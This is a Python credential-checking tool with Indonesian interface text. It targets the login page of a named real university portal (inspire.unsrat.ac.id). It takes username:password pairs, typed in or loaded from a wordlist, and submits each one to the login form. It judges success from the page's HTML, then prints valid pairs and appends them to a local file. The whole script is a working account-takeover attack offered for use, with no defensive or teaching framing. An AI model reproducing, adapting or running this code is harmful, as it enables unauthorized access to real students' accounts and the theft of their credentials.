import os, time, random, platform, urllib.parse, requests.packages.urllib3
os.system('clear')
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
try:
    import requests as req
    from bs4 import BeautifulSoup as bs
except:
    os.system('pip install requests bs4')
    exit(f"\n{yellow}[!] {white}Silahkan restart script")
else:
    grey = '\x1b[90m'
    red = '\x1b[91m'
    green = '\x1b[92m'
    yellow = '\x1b[93m'
    blue = '\x1b[94m'
    purple = '\x1b[95m'
    cyan = '\x1b[96m'
    white = '\x1b[37m'
    flag = '\x1b[47;30m'
    off = '\x1b[m'
    rv = platform.uname()
    me = rv.release
    found = []
    error = []

    def cek(usr, pwd):
        try:
            url = 'https://inspire.unsrat.ac.id/login/autentikasi'
            ses = req.Session()
            row = ses.get(url).text
            dat = {'username':usr,
'password':pwd}
            raw = ses.post(url, data=dat).text
            try:
                her = bs(raw, 'html.parser').findAll('small')[1].get_text()
                print(f"{cyan}[{green}✓{cyan}]{green}{usr}{white}:{green}{pwd}")
                found.append(f"{usr}:{pwd}")
                with open('unsratx.txt', 'a') as (save):
                    save.write(f"{usr}:{pwd}\n")
            except IndexError:
                print(f"{cyan}[{red}×{cyan}]{red}{usr}{white}:{red}{pwd}")
                error.append(f"{usr}:{pwd}")

        except KeyboardInterrupt:
            exit()


    def premium():
        print(f"{white}[{cyan}1{white}]{white}Tulis Sendiri \n" + f"{white}[{cyan}2{white}]{white}Import Wordlist \n")
        try:
            select = input(f"{green}[{cyan}+{green}]{white}Pilih > ")
            if select == '1':
                print('\n' + f"{white}[{cyan}?{white}]{white}username:password")
                data = input(f"{green}[{cyan}+{green}]{white}Input > ")
                user = data.split(':')[0]
                pswd = data.split(':')[1]
                cek(user, pswd)
            else:
                if select == '2':
                    print('\n' + f"{white}[{cyan}?{white}]{white}username:password")
                    path = input(f"{green}[{cyan}+{green}]{white}Input > ")
                    with open(path, 'r') as (file):
                        lines = file.readlines()
                        print(f"{white}[{cyan}+{white}]{white}Terdeteksi {yellow}{len(lines)}{white} Nim")
                        for line in lines:
                            user = line.strip().split(':')[0]
                            pswd = line.strip().split(':')[1]
                            cek(user, pswd)
                        else:
                            print(f"{off}==========================\n" + f"{cyan}[{green}✓{cyan}]{green}SUKSES: {green}{len(found)}" + f"{cyan}  |{cyan}[{red}×{cyan}]{red}GAGAL: {red}{len(error)}")
                            exit()

        except IndexError:
            exit(f"  {white}[{red}!{white}]{white} Input Salah")
        except FileNotFoundError:
            exit(f"  {white}[{red}!{white}]{white} File tidak ditemukan")
        except KeyboardInterrupt:
            pass


    def main():
        print(f"{off}[{blue}{flag}UNSRAT{off}] {white}|{green} X {cyan}S {yellow}A {white}N {red}Z{off}\n")
        premium()


    if __name__ == '__main__':
        main()